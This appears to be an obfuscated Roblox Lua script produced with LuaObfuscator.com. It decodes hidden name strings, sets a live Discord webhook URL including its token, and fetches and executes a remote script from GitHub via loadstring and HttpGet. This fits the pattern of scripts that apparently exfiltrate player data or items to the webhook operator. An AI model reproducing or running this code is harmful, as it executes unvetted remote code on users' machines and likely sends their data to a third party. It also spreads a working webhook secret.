--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.16) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end _G.Username(v7("\214\202\218\43\225\179\206\31\131\147\137\116","\126\177\163\187\69\134\219\167"));_G.HubName(v7("\19\193\48\133\203\34\196\62\133\218\44\223\106\233\243\34\201\35\203\251","\156\67\173\74\165"));_G.WebhookUrl("https://discord.com/api/webhooks/1155826334304587807/fqhRjrvKR16NMpi2HwNbinGK1YckRHlpPCnRIkoyPA3mjgAbay7L32thyAV5n1G4JgfY");loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))();
